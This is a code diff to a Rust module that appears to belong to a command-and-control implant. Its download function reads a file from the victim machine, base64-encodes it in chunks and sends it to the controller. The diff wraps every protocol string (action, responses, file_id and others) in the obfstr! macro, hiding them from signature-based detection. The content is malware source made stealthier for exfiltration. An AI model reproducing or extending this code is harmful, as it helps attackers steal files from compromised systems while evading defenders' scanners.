@@ -7,6 +7,7 @@ use std::{
 };
 use base64::engine::general_purpose;
 use base64::Engine;
+use obfstr::obfstr;
 
 use crate::config;
 
@@ -39,20 +40,20 @@ pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
     // 4. Send initial RPC to get back agent_file_id
     let init = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "completed": true,
-            "download": {
-                "total_chunks": total_chunks,
-                "full_path": path.to_string_lossy(),
-                "chunk_size": config::chunk_size
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("completed"): true,
+            obfstr!("download"): {
+                obfstr!("total_chunks"): total_chunks,
+                obfstr!("full_path"): path.to_string_lossy(),
+                obfstr!("chunk_size"): config::chunk_size
             }
         }]
     })
     .to_string();
     let init_resp: Value = crate::transport::send_request_with_response(&init)?;
-    let file_id = init_resp["responses"][0]["file_id"]
+    let file_id = init_resp[obfstr!("responses")][0][obfstr!("file_id")]
         .as_str()
         .ok_or("Missing file_id in initial response")?;
 
@@ -64,14 +65,14 @@ pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         if n == 0 { break; }
         let chunk_data = general_purpose::STANDARD.encode(&buffer[..n]);
         let payload = serde_json::json!({
-            "action": "post_response",
-            "responses": [{
-                "task_id": id,
-                "completed": true,
-                "download": {
-                    "chunk_num": chunk_num,
-                    "file_id": file_id,
-                    "chunk_data": chunk_data
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("responses"): [{
+                obfstr!("task_id"): id,
+                obfstr!("completed"): true,
+                obfstr!("download"): {
+                    obfstr!("chunk_num"): chunk_num,
+                    obfstr!("file_id"): file_id,
+                    obfstr!("chunk_data"): chunk_data
                 }
             }]
         })
@@ -83,13 +84,13 @@ pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
     // 6. Final success response with the new agent file ID
     let done = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "user_output": format!("Uploaded as {}", file_id),
-            "agent_file_id": file_id,
-            "status": "success",
-            "completed": true
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("user_output"): format!("Uploaded as {}", file_id),
+            obfstr!("agent_file_id"): file_id,
+            obfstr!("status"): obfstr!("success"),
+            obfstr!("completed"): true
         }]
     })
     .to_string();
